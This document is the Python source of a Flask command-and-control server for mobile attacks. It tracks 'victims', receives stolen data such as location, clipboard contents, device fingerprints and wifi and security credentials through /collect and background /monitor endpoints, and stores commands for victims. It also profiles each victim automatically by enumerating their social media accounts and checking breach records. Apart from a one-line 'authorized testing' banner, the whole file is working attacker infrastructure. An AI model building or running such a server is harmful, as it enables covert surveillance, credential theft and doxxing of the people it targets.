#!/usr/bin/env python3
"""
Enhanced C&C Server with OSINT Social Media Intelligence
Part 1: Backend API and Data Collection Engine
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import sqlite3
import os
from datetime import datetime, timedelta
import base64
import time
import traceback
import requests
import re
import urllib.parse
from threading import Thread
import hashlib
import random
from collections import defaultdict

app = Flask(__name__)
CORS(app)

# Configuration
PORT = int(os.environ.get('PORT', 5000))
DATABASE = 'c2_data.db'

# OSINT API Keys (Configure these with your keys)
OSINT_CONFIG = {
    'twitter_bearer_token': os.environ.get('TWITTER_BEARER_TOKEN', ''),
    'linkedin_api_key': os.environ.get('LINKEDIN_API_KEY', ''),
    'facebook_access_token': os.environ.get('FACEBOOK_ACCESS_TOKEN', ''),
    'instagram_access_token': os.environ.get('INSTAGRAM_ACCESS_TOKEN', ''),
    'haveibeenpwned_api_key': os.environ.get('HIBP_API_KEY', ''),
    'pipl_api_key': os.environ.get('PIPL_API_KEY', ''),
    'clearbit_api_key': os.environ.get('CLEARBIT_API_KEY', ''),
    'fullcontact_api_key': os.environ.get('FULLCONTACT_API_KEY', '')
}

def init_enhanced_db():
    """Initialize enhanced database with OSINT tables"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Drop and recreate tables with enhanced schema
        cursor.execute('DROP TABLE IF EXISTS osint_profiles')
        cursor.execute('DROP TABLE IF EXISTS osint_social_accounts')
        cursor.execute('DROP TABLE IF EXISTS osint_data_breaches')
        cursor.execute('DROP TABLE IF EXISTS osint_lookup_history')
        cursor.execute('DROP TABLE IF EXISTS enriched_victims')
        
        # Enhanced victims table with OSINT fields
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                session_id TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address TEXT,
                attack_type TEXT,
                status TEXT DEFAULT 'active',
                location_lat REAL,
                location_lng REAL,
                device_info TEXT,
                permissions_granted TEXT,
                notes TEXT,
                osint_enriched BOOLEAN DEFAULT FALSE,
                osint_score INTEGER DEFAULT 0,
                risk_level TEXT DEFAULT 'unknown'
            )
        ''')
        
        # OSINT profiles table
        cursor.execute('''
            CREATE TABLE osint_profiles (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                email TEXT,
                phone TEXT,
                full_name TEXT,
                username TEXT,
                domain TEXT,
                job_title TEXT,
                company TEXT,
                location TEXT,
                bio TEXT,
                profile_image_url TEXT,
                verified BOOLEAN DEFAULT FALSE,
                followers_count INTEGER DEFAULT 0,
                following_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
            )
        ''')
        
        # Social media accounts table
        cursor.execute('''
            CREATE TABLE osint_social_accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                profile_id INTEGER,
                platform TEXT,
                username TEXT,
                profile_url TEXT,
                display_name TEXT,
                bio TEXT,
                followers_count INTEGER DEFAULT 0,
                following_count INTEGER DEFAULT 0,
                posts_count INTEGER DEFAULT 0,
                verified BOOLEAN DEFAULT FALSE,
                account_created DATE,
                last_post_date DATE,
                profile_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (profile_id) REFERENCES osint_profiles (id)
            )
        ''')
        
        # Data breaches table
        cursor.execute('''
            CREATE TABLE osint_data_breaches (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                profile_id INTEGER,
                email TEXT,
                breach_name TEXT,
                breach_date DATE,
                breach_description TEXT,
                data_classes TEXT,
                verified BOOLEAN DEFAULT FALSE,
                breach_severity TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (profile_id) REFERENCES osint_profiles (id)
            )
        ''')
        
        # OSINT lookup history
        cursor.execute('''
            CREATE TABLE osint_lookup_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                lookup_type TEXT,
                query_value TEXT,
                platform TEXT,
                status TEXT,
                results_count INTEGER DEFAULT 0,
                api_cost REAL DEFAULT 0.0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims (victim_id)
            )
        ''')
        
        # Keep existing tables for backward compatibility
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source_url TEXT,
                severity TEXT DEFAULT 'medium',
                tags TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                command_type TEXT,
                command_data TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Enhanced database with OSINT tables initialized successfully")
        return True
        
    except Exception as e:
        log_activity(f"❌ Database initialization failed: {e}")
        return False

def log_activity(message, ip_address="server"):
    """Enhanced logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")

class OSINTCollector:
    """OSINT data collection and enrichment engine"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def sanitize_email(self, email):
        """Sanitize and validate email address"""
        if not email or '@' not in email:
            return None
        return email.lower().strip()
    
    def extract_username_from_email(self, email):
        """Extract potential username from email"""
        if not email:
            return None
        return email.split('@')[0]
    
    def generate_username_variations(self, name, email):
        """Generate potential username variations"""
        variations = set()
        
        if email:
            variations.add(email.split('@')[0])
        
        if name:
            name_parts = name.lower().replace(' ', '').split()
            if len(name_parts) >= 2:
                first, last = name_parts[0], name_parts[-1]
                variations.update([
                    first + last,
                    first + '.' + last,
                    first + '_' + last,
                    first[0] + last,
                    last + first[0],
                    first,
                    last
                ])
        
        return list(variations)
    
    def check_haveibeenpwned(self, email):
        """Check if email appears in data breaches"""
        if not OSINT_CONFIG.get('haveibeenpwned_api_key') or not email:
            return []
        
        try:
            url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
            headers = {
                'hibp-api-key': OSINT_CONFIG['haveibeenpwned_api_key'],
                'User-Agent': 'C2-OSINT-Tool'
            }
            
            response = self.session.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                breaches = response.json()
                log_activity(f"🔍 Found {len(breaches)} breaches for {email}")
                return breaches
            elif response.status_code == 404:
                log_activity(f"✅ No breaches found for {email}")
                return []
            else:
                log_activity(f"⚠️ HIBP API error {response.status_code} for {email}")
                return []
                
        except Exception as e:
            log_activity(f"❌ HIBP lookup failed for {email}: {e}")
            return []
    
    def search_social_platforms_basic(self, username):
        """Basic social media platform enumeration"""
        platforms = {
            'twitter': f'https://twitter.com/{username}',
            'instagram': f'https://instagram.com/{username}',
            'linkedin': f'https://linkedin.com/in/{username}',
            'github': f'https://github.com/{username}',
            'facebook': f'https://facebook.com/{username}',
            'tiktok': f'https://tiktok.com/@{username}',
            'youtube': f'https://youtube.com/@{username}',
            'pinterest': f'https://pinterest.com/{username}',
            'reddit': f'https://reddit.com/user/{username}',
            'tumblr': f'https://{username}.tumblr.com'
        }
        
        found_accounts = []
        
        for platform, url in platforms.items():
            try:
                response = self.session.get(url, timeout=5, allow_redirects=True)
                
                # Check for indicators that the profile exists
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Platform-specific existence indicators
                    exists = False
                    if platform == 'twitter' and 'this account doesn\'t exist' not in content:
                        exists = True
                    elif platform == 'instagram' and 'sorry, this page isn\'t available' not in content:
                        exists = True
                    elif platform == 'linkedin' and 'member not found' not in content:
                        exists = True
                    elif platform == 'github' and 'not found' not in content:
                        exists = True
                    elif platform == 'facebook' and 'content not found' not in content:
                        exists = True
                    elif response.status_code == 200:
                        exists = True  # Assume exists if page loads
                    
                    if exists:
                        found_accounts.append({
                            'platform': platform,
                            'username': username,
                            'url': url,
                            'status': 'found'
                        })
                        log_activity(f"✅ Found {username} on {platform}")
                
                # Rate limiting
                time.sleep(0.5)
                
            except Exception as e:
                log_activity(f"⚠️ Error checking {platform} for {username}: {e}")
                continue
        
        return found_accounts
    
    def extract_profile_data_from_page(self, url, platform):
        """Extract basic profile data from social media page"""
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code != 200:
                return {}
            
            content = response.text
            data = {}
            
            # Extract common meta tags
            meta_patterns = {
                'title': r'<title[^>]*>([^<]+)</title>',
                'description': r'<meta[^>]*name=["\']description["\'][^>]*content=["\']([^"\']+)["\']',
                'og_title': r'<meta[^>]*property=["\']og:title["\'][^>]*content=["\']([^"\']+)["\']',
                'og_description': r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\']([^"\']+)["\']',
                'og_image': r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']'
            }
            
            for key, pattern in meta_patterns.items():
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    data[key] = match.group(1).strip()
            
            # Platform-specific extraction
            if platform == 'linkedin':
                # Extract job title and company from LinkedIn
                job_match = re.search(r'<h2[^>]*class=["\'][^"\']*subtitle[^"\']*["\'][^>]*>([^<]+)</h2>', content)
                if job_match:
                    data['job_title'] = job_match.group(1).strip()
            
            return data
            
        except Exception as e:
            log_activity(f"❌ Error extracting data from {url}: {e}")
            return {}
    
    def enrich_victim_profile(self, victim_id, email=None, phone=None, name=None):
        """Main profile enrichment function"""
        log_activity(f"🔍 Starting OSINT enrichment for victim {victim_id}")
        
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            
            # Create OSINT profile entry
            cursor.execute('''
                INSERT INTO osint_profiles (victim_id, email, phone, full_name)
                VALUES (?, ?, ?, ?)
            ''', (victim_id, email, phone, name))
            
            profile_id = cursor.lastrowid
            
            # Generate username variations
            usernames = self.generate_username_variations(name, email)
            
            # Check data breaches
            breaches = []
            if email:
                breaches = self.check_haveibeenpwned(email)
                
                # Store breach data
                for breach in breaches:
                    cursor.execute('''
                        INSERT INTO osint_data_breaches 
                        (profile_id, email, breach_name, breach_date, breach_description, data_classes, verified)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        profile_id, email, breach['Name'], breach.get('BreachDate'),
                        breach.get('Description', ''), json.dumps(breach.get('DataClasses', [])),
                        breach.get('IsVerified', False)
                    ))
            
            # Search social platforms
            all_social_accounts = []
            for username in usernames[:5]:  # Limit to prevent API abuse
                accounts = self.search_social_platforms_basic(username)
                
                for account in accounts:
                    # Extract additional profile data
                    profile_data = self.extract_profile_data_from_page(account['url'], account['platform'])
                    
                    cursor.execute('''
                        INSERT INTO osint_social_accounts 
                        (profile_id, platform, username, profile_url, display_name, bio, profile_data)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        profile_id, account['platform'], account['username'], account['url'],
                        profile_data.get('og_title', ''), profile_data.get('og_description', ''),
                        json.dumps(profile_data)
                    ))
                
                all_social_accounts.extend(accounts)
                
                # Log lookup history
                cursor.execute('''
                    INSERT INTO osint_lookup_history 
                    (victim_id, lookup_type, query_value, platform, status, results_count)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (victim_id, 'username_search', username, 'multiple', 'completed', len(accounts)))
            
            # Calculate OSINT score
            osint_score = self.calculate_osint_score(len(breaches), len(all_social_accounts))
            risk_level = self.determine_risk_level(osint_score, len(breaches))
            
            # Update victim with OSINT data
            cursor.execute('''
                UPDATE victims 
                SET osint_enriched = TRUE, osint_score = ?, risk_level = ?
                WHERE victim_id = ?
            ''', (osint_score, risk_level, victim_id))
            
            # Update profile with calculated data
            cursor.execute('''
                UPDATE osint_profiles 
                SET last_updated = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (profile_id,))
            
            conn.commit()
            conn.close()
            
            log_activity(f"✅ OSINT enrichment completed for {victim_id}: Score {osint_score}, Risk {risk_level}")
            
            return {
                'success': True,
                'profile_id': profile_id,
                'osint_score': osint_score,
                'risk_level': risk_level,
                'breaches_found': len(breaches),
                'social_accounts': len(all_social_accounts),
                'usernames_checked': len(usernames)
            }
            
        except Exception as e:
            log_activity(f"❌ OSINT enrichment failed for {victim_id}: {e}")
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
    
    def calculate_osint_score(self, breach_count, social_count):
        """Calculate OSINT risk score (0-100)"""
        score = 0
        
        # Base score for having any online presence
        if social_count > 0:
            score += 20
        
        # Social media presence scoring
        score += min(social_count * 8, 40)  # Max 40 points for social media
        
        # Data breach scoring (high impact)
        score += min(breach_count * 15, 40)  # Max 40 points for breaches
        
        return min(score, 100)
    
    def determine_risk_level(self, score, breach_count):
        """Determine risk level based on OSINT score"""
        if breach_count > 3 or score >= 80:
            return 'critical'
        elif breach_count > 1 or score >= 60:
            return 'high'
        elif score >= 40:
            return 'medium'
        elif score >= 20:
            return 'low'
        else:
            return 'minimal'

# Initialize OSINT collector
osint_collector = OSINTCollector()

def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
    """Enhanced victim data storage with auto-OSINT trigger"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Extract potential OSINT data from content
        email = None
        phone = None
        name = None
        
        if isinstance(content, dict):
            email = content.get('email') or content.get('user_email')
            phone = content.get('phone') or content.get('phone_number')
            name = content.get('name') or content.get('full_name')
            
            session_id = content.get('session_id', '')
            
            # Extract location data
            location_lat, location_lng = None, None
            if 'latitude' in content and 'longitude' in content:
                location_lat = content.get('latitude')
                location_lng = content.get('longitude')
        
        # Update or insert victim info
        cursor.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, session_id, last_seen, user_agent, ip_address, attack_type, 
             location_lat, location_lng)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (victim_id, session_id, datetime.now(), user_agent, ip_address, attack_type,
              location_lat, location_lng))
        
        # Determine severity
        severity = 'low'
        if data_type in ['location_data', 'clipboard_data', 'device_fingerprint']:
            severity = 'high'
        elif data_type in ['permission_granted', 'background_monitor']:
            severity = 'medium'
        
        # Store data point
        content_str = json.dumps(content) if isinstance(content, dict) else str(content)
        cursor.execute('''
            INSERT INTO collected_data 
            (victim_id, data_type, data_content, source_url, severity)
            VALUES (?, ?, ?, ?, ?)
        ''', (victim_id, data_type, content_str, source_url, severity))
        
        conn.commit()
        conn.close()
        
        # Trigger OSINT enrichment if we have valuable data and haven't enriched yet
        if (email or phone or name) and data_type in ['initial_compromise', 'wifi_credentials', 'security_credentials']:
            Thread(target=trigger_osint_enrichment, args=(victim_id, email, phone, name)).start()
        
        log_activity(f"💾 Stored {data_type} ({severity}) for victim {victim_id[:12]}...", ip_address)
        return True
        
    except Exception as e:
        log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
        traceback.print_exc()
        return False

def trigger_osint_enrichment(victim_id, email, phone, name):
    """Trigger OSINT enrichment in background thread"""
    try:
        # Check if already enriched
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute('SELECT osint_enriched FROM victims WHERE victim_id = ?', (victim_id,))
        result = cursor.fetchone()
        conn.close()
        
        if result and result[0]:
            log_activity(f"⏭️ Skipping OSINT for {victim_id} - already enriched")
            return
        
        # Perform enrichment
        log_activity(f"🚀 Triggering OSINT enrichment for {victim_id}")
        result = osint_collector.enrich_victim_profile(victim_id, email, phone, name)
        
        if result['success']:
            log_activity(f"✅ Auto-OSINT completed for {victim_id}")
        else:
            log_activity(f"❌ Auto-OSINT failed for {victim_id}: {result.get('error')}")
            
    except Exception as e:
        log_activity(f"❌ OSINT enrichment error for {victim_id}: {e}")

# Enhanced API Endpoints

@app.route('/api/osint/enrich/<victim_id>', methods=['POST'])
def api_manual_osint_enrichment(victim_id):
    """Manual OSINT enrichment trigger"""
    try:
        data = request.get_json() or {}
        email = data.get('email')
        phone = data.get('phone')
        name = data.get('name')
        
        log_activity(f"🔍 Manual OSINT enrichment requested for {victim_id}")
        
        result = osint_collector.enrich_victim_profile(victim_id, email, phone, name)
        
        return jsonify(result)
        
    except Exception as e:
        log_activity(f"❌ Manual OSINT enrichment error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/osint/profile/<victim_id>')
def api_get_osint_profile(victim_id):
    """Get complete OSINT profile for victim"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get profile data
        cursor.execute('''
            SELECT * FROM osint_profiles WHERE victim_id = ?
        ''', (victim_id,))
        profile_data = cursor.fetchone()
        
        if not profile_data:
            return jsonify({'error': 'No OSINT profile found'}), 404
        
        profile_id = profile_data[0]
        
        # Get social accounts
        cursor.execute('''
            SELECT * FROM osint_social_accounts WHERE profile_id = ?
        ''', (profile_id,))
        social_accounts = cursor.fetchall()
        
        # Get breaches
        cursor.execute('''
            SELECT * FROM osint_data_breaches WHERE profile_id = ?
        ''', (profile_id,))
        breaches = cursor.fetchall()
        
        # Get lookup history
        cursor.execute('''
            SELECT * FROM osint_lookup_history WHERE victim_id = ?
        ''', (victim_id,))
        lookup_history = cursor.fetchall()
        
        conn.close()
        
        return jsonify({
            'profile': {
                'id': profile_data[0],
                'victim_id': profile_data[1],
                'email': profile_data[2],
                'phone': profile_data[3],
                'full_name': profile_data[4],
                'username': profile_data[5],
                'domain': profile_data[6],
                'job_title': profile_data[7],
                'company': profile_data[8],
                'location': profile_data[9],
                'bio': profile_data[10],
                'created_at': profile_data[12],
                'last_updated': profile_data[13]
            },
            'social_accounts': [
                {
                    'id': acc[0],
                    'platform': acc[2],
                    'username': acc[3],
                    'profile_url': acc[4],
                    'display_name': acc[5],
                    'bio': acc[6],
                    'followers_count': acc[7],
                    'following_count': acc[8],
                    'verified': acc[10]
                } for acc in social_accounts
            ],
            'breaches': [
                {
                    'id': breach[0],
                    'email': breach[2],
                    'breach_name': breach[3],
                    'breach_date': breach[4],
                    'description': breach[5],
                    'data_classes': json.loads(breach[6]) if breach[6] else [],
                    'verified': breach[7]
                } for breach in breaches
            ],
            'lookup_history': [
                {
                    'lookup_type': hist[2],
                    'query_value': hist[3],
                    'platform': hist[4],
                    'status': hist[5],
                    'results_count': hist[6],
                    'created_at': hist[8]
                } for hist in lookup_history
            ]
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting OSINT profile: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/osint/search', methods=['POST'])
def api_osint_search():
    """Manual OSINT search endpoint"""
    try:
        data = request.get_json()
        query_type = data.get('type')  # 'email', 'username', 'phone'
        query_value = data.get('value')
        platforms = data.get('platforms', ['all'])
        
        results = {}
        
        if query_type == 'email':
            # Check breaches
            breaches = osint_collector.check_haveibeenpwned(query_value)
            results['breaches'] = breaches
            
            # Generate usernames from email
            username = osint_collector.extract_username_from_email(query_value)
            if username:
                social_accounts = osint_collector.search_social_platforms_basic(username)
                results['social_accounts'] = social_accounts
                
        elif query_type == 'username':
            social_accounts = osint_collector.search_social_platforms_basic(query_value)
            results['social_accounts'] = social_accounts
            
        return jsonify({
            'success': True,
            'query_type': query_type,
            'query_value': query_value,
            'results': results
        })
        
    except Exception as e:
        log_activity(f"❌ OSINT search error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/osint/stats')
def api_osint_stats():
    """Get OSINT statistics"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get overall stats
        cursor.execute('SELECT COUNT(*) FROM osint_profiles')
        total_profiles = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM osint_social_accounts')
        total_social_accounts = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM osint_data_breaches')
        total_breaches = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM victims WHERE osint_enriched = TRUE')
        enriched_victims = cursor.fetchone()[0] or 0
        
        # Get platform distribution
        cursor.execute('''
            SELECT platform, COUNT(*) 
            FROM osint_social_accounts 
            GROUP BY platform 
            ORDER BY COUNT(*) DESC
        ''')
        platform_stats = dict(cursor.fetchall())
        
        # Get risk level distribution
        cursor.execute('''
            SELECT risk_level, COUNT(*) 
            FROM victims 
            WHERE risk_level IS NOT NULL 
            GROUP BY risk_level
        ''')
        risk_distribution = dict(cursor.fetchall())
        
        conn.close()
        
        return jsonify({
            'total_profiles': total_profiles,
            'total_social_accounts': total_social_accounts,
            'total_breaches': total_breaches,
            'enriched_victims': enriched_victims,
            'platform_stats': platform_stats,
            'risk_distribution': risk_distribution
        })
        
    except Exception as e:
        log_activity(f"❌ Error getting OSINT stats: {e}")
        return jsonify({'error': str(e)}), 500

# Keep all existing endpoints from previous version
@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect_data():
    """Enhanced data collection with OSINT triggers"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id', f'unknown_{int(time.time())}')
        data_type = data.get('type', 'unknown')
        source_url = data.get('source_url', 'unknown')
        attack_type = data.get('attack_type', 'unknown')
        
        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
        
        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
        
        if success:
            return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
        else:
            return jsonify({'status': 'error', 'message': 'Database storage failed'}), 500
        
    except Exception as e:
        log_activity(f"❌ Error in collect_data: {e}")
        traceback.print_exc()
        return jsonify({'error': 'Internal server error', 'message': str(e)}), 500

@app.route('/monitor', methods=['POST', 'OPTIONS'])
def monitor_endpoint():
    """Background monitoring endpoint"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id') or f'monitor_{ip_address}_{int(time.time())}'
        
        log_activity(f"📡 MONITOR: Background data from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'background_monitor', data, 'service_worker', ip_address, user_agent, 'background')
        
        return jsonify({'status': 'monitored'})
        
    except Exception as e:
        log_activity(f"❌ Error in monitor_endpoint: {e}")
        return jsonify({'error': 'failed'}), 500

@app.route('/api/dashboard-data')
def api_dashboard_data():
    """Enhanced dashboard data with OSINT statistics"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get victim statistics
        cursor.execute('SELECT COUNT(*) FROM victims')
        total_victims = cursor.fetchone()[0] or 0
        
        five_minutes_ago = datetime.now() - timedelta(minutes=5)
        cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
        online_victims = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM collected_data')
        total_data = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM collected_data WHERE severity = "high"')
        high_severity = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(DISTINCT attack_type) FROM victims')
        attack_types = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM victims WHERE osint_enriched = TRUE')
        osint_enriched = cursor.fetchone()[0] or 0
        
        # Get enhanced victims data with OSINT info
        cursor.execute('''
            SELECT victim_id, attack_type, ip_address, last_seen, user_agent, 
                   status, location_lat, location_lng, device_info, permissions_granted,
                   first_seen, osint_enriched, osint_score, risk_level
            FROM victims 
            ORDER BY last_seen DESC 
            LIMIT 100
        ''')
        
        victims = []
        for row in cursor.fetchall():
            victims.append({
                'victim_id': row[0],
                'attack_type': row[1],
                'ip_address': row[2],
                'last_seen': row[3],
                'user_agent': row[4],
                'status': row[5],
                'location_lat': row[6],
                'location_lng': row[7],
                'device_info': row[8],
                'permissions_granted': row[9],
                'first_seen': row[10],
                'osint_enriched': row[11],
                'osint_score': row[12],
                'risk_level': row[13]
            })
        
        # Get recent data points
        cursor.execute('''
            SELECT id, victim_id, data_type, data_content, timestamp, 
                   source_url, severity, tags
            FROM collected_data 
            ORDER BY timestamp DESC 
            LIMIT 200
        ''')
        
        data_points = []
        for row in cursor.fetchall():
            data_points.append({
                'id': row[0],
                'victim_id': row[1],
                'data_type': row[2],
                'data_content': row[3],
                'timestamp': row[4],
                'source_url': row[5],
                'severity': row[6],
                'tags': row[7]
            })
        
        conn.close()
        
        return jsonify({
            'stats': {
                'total_victims': total_victims,
                'online_victims': online_victims,
                'total_data': total_data,
                'high_severity': high_severity,
                'attack_types': attack_types,
                'osint_enriched': osint_enriched
            },
            'victims': victims,
            'dataPoints': data_points
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_dashboard_data: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/health')
def health_check():
    """Enhanced health check with OSINT status"""
    return jsonify({
        'status': 'healthy',
        'service': 'mobile-security-c2-osint',
        'timestamp': datetime.now().isoformat(),
        'version': '2.1.0-osint',
        'features': [
            'Advanced Dashboard',
            'Real-time Monitoring', 
            'Data Export',
            'Command & Control',
            'Geolocation Tracking',
            'Timeline Analysis',
            'OSINT Social Media Intelligence',
            'Data Breach Monitoring',
            'Risk Assessment'
        ],
        'osint_config': {
            'haveibeenpwned': bool(OSINT_CONFIG.get('haveibeenpwned_api_key')),
            'twitter': bool(OSINT_CONFIG.get('twitter_bearer_token')),
            'linkedin': bool(OSINT_CONFIG.get('linkedin_api_key')),
            'clearbit': bool(OSINT_CONFIG.get('clearbit_api_key'))
        }
    })

def print_startup_banner():
    """Enhanced startup banner with OSINT features"""
    print("=" * 80)
    print("🎯 ADVANCED MOBILE SECURITY C&C SERVER WITH OSINT")
    print("=" * 80)
    print("🚅 Platform: Railway")
    print("📡 Status: ONLINE")
    print(f"🌐 Port: {PORT}")
    print("💾 Database: SQLite (Enhanced with OSINT)")
    print("🔧 Version: 2.1.0-osint")
    print("=" * 80)
    print("🔍 OSINT FEATURES:")
    print("  ✅ Social Media Intelligence")
    print("  ✅ Data Breach Monitoring (HaveIBeenPwned)")
    print("  ✅ Username Enumeration")
    print("  ✅ Profile Enrichment")
    print("  ✅ Risk Assessment")
    print("  ✅ Automated OSINT Collection")
    print("=" * 80)
    print("🚀 EXISTING FEATURES:")
    print("  ✅ Advanced Dashboard with Multiple Views")
    print("  ✅ Real-time Victim Monitoring")
    print("  ✅ Geolocation Tracking & Mapping")
    print("  ✅ Timeline Analysis")
    print("  ✅ Command & Control System")
    print("  ✅ Data Export (CSV/JSON)")
    print("=" * 80)
    print("📱 OSINT API Endpoints:")
    print("  POST /api/osint/enrich/<victim_id> - Manual OSINT enrichment")
    print("  GET  /api/osint/profile/<victim_id> - Get OSINT profile")
    print("  POST /api/osint/search - Manual OSINT search")
    print("  GET  /api/osint/stats - OSINT statistics")
    print("=" * 80)
    print("🔧 OSINT Configuration:")
    print(f"  HaveIBeenPwned: {'✅' if OSINT_CONFIG.get('haveibeenpwned_api_key') else '❌'}")
    print(f"  Twitter API: {'✅' if OSINT_CONFIG.get('twitter_bearer_token') else '❌'}")
    print(f"  LinkedIn API: {'✅' if OSINT_CONFIG.get('linkedin_api_key') else '❌'}")
    print(f"  Clearbit API: {'✅' if OSINT_CONFIG.get('clearbit_api_key') else '❌'}")
    print("=" * 80)
    print("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)

if __name__ == '__main__':
    # Initialize enhanced database
    init_success = init_enhanced_db()
    
    if not init_success:
        print("❌ Failed to initialize database, continuing anyway...")
    
    # Print startup banner
    print_startup_banner()
    
    # Start server
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        threaded=True
    )